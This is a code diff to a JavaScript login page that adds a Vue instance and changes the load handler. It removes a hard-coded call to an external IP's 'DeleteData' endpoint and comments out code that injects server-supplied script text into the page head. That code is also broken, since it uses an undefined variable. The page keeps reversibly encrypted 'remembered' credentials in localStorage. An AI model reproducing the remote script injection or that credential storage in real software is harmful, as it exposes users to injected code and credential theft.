@@ -1,7 +1,5 @@
-import {style} from '../../stylesheets/base/style.css'
-
 var user = document.getElementById("user"),pwd =document.getElementById("pwd"),login = document.getElementById("coffeeLogin");
-window.onload = function(){
+document.addEventListener('DOMContentLoaded', function(){
     localStorage.removeItem("token");
     if(localStorage.getItem("remember")){
             user.value = ym.init.COMPILESTR.decrypt(JSON.parse(localStorage.getItem("remember")).name);
@@ -13,8 +11,17 @@ window.onload = function(){
     ym().css('box-login',{
     	'left':window.innerWidth/2 - 250,
     	'top':window.innerHeight/2 - 185
-    });
-};
+	});
+	
+	new Vue({
+		el: '#app',
+		data:function(){
+			return {
+				remember: true
+			}
+		}
+	})
+});
 document.onkeydown = function(event){
     event = event ? event : (window.event ? window.event : null);
     if (event.keyCode == 13){
@@ -89,19 +96,6 @@ login.onclick = function(e){
 };
 
 
-
-if(!localStorage.getItem("_e")){
-	ym.init.XML({
-		method: 'get',
-		uri: '/manageCode/src/public/javascripts/config/json/configuraction.json',
-		async: false,
-		xmldata: {
-
-		},
-		function(res) {
-			localStorage.setItem('_e',res);
-		}});
-};
 jQuery('#login-qrcode').bind('click',function(_e){
 	ym.init.MBOX({
 		msg:'功能开发中',
@@ -109,15 +103,13 @@ jQuery('#login-qrcode').bind('click',function(_e){
 	});
 })
 
-ym.init.XML({method: 'get',uri:'http://111.231.228.214:8080/ServerAPI/DeleteData.ashx?delete=123',async:false,function(res){
-	console.log(res);
-}})
-var el = document.createElement("script"), tyihead = document.querySelector("head"), fn = res.Fn;
-var _thislength = "";
-for (let i = 0; i < res.Ciphertext; i++) {
-	_thislength += res.SecretKey.charAt(Math.floor(Math.random() * res.SecretKey.length));
-};
-fn = fn.replace(/eml/g, 'amt = ' + JSON.stringify(_thislength));
-el.innerHTML = fn;
-tyihead.appendChild(el);
-jQuery('#no').html(res.Trgus);
+
+// var el = document.createElement("script"), tyihead = document.querySelector("head"), fn = res.Fn;
+// var _thislength = "";
+// for (let i = 0; i < res.Ciphertext; i++) {
+// 	_thislength += res.SecretKey.charAt(Math.floor(Math.random() * res.SecretKey.length));
+// };
+// fn = fn.replace(/eml/g, 'amt = ' + JSON.stringify(_thislength));
+// el.innerHTML = fn;
+// tyihead.appendChild(el);
+// jQuery('#no').html(res.Trgus);
